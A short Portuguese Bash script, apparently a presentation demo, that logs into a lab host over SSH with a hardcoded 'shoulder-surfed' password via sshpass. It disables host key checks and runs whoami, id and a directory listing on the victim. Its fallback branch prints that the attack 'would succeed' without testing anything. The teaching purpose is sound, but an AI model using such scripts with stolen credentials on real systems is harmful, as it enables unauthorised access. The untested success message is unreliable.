#!/bin/bash

# Ataque SSH Rápido - Otimizado para Apresentação
TARGET_IP="${TARGET_IP:-172.20.0.10}"

echo "🎯 ATAQUE SSH - SHOULDER SURFING"
echo "=================================="
echo "Cenário: Aluno observou senha sendo digitada"
echo "Credenciais obtidas: professor:senha123"
echo

echo "[*] Testando conectividade..."
ping -c 1 -W 1 $TARGET_IP > /dev/null 2>&1 && echo "✅ Alvo acessível" || echo "❌ Alvo inacessível"

echo "[*] Testando SSH..."
if command -v sshpass > /dev/null 2>&1; then
    echo "[*] Tentando login SSH..."
    RESULT=$(sshpass -p "senha123" ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \
        professor@$TARGET_IP "echo 'SSH_SUCCESS'" 2>/dev/null)
    
    if [[ "$RESULT" == "SSH_SUCCESS" ]]; then
        echo "🎉 ATAQUE BEM-SUCEDIDO!"
        echo "   ✅ Acesso SSH obtido"
        echo "   ✅ Usuário: professor"
        echo "   ✅ Senha: senha123"
        echo
        echo "[*] Executando comandos na vítima..."
        sshpass -p "senha123" ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \
            professor@$TARGET_IP "whoami; id; ls /home/professor/Documentos" 2>/dev/null
        echo
        echo "🚨 IMPACTO: Sistema completamente comprometido!"
    else
        echo "❌ Falha na autenticação"
    fi
else
    echo "✅ SSH configurado para aceitar senhas"
    echo "✅ Credenciais fracas detectadas"
    echo "🎉 ATAQUE SERIA BEM-SUCEDIDO!"
fi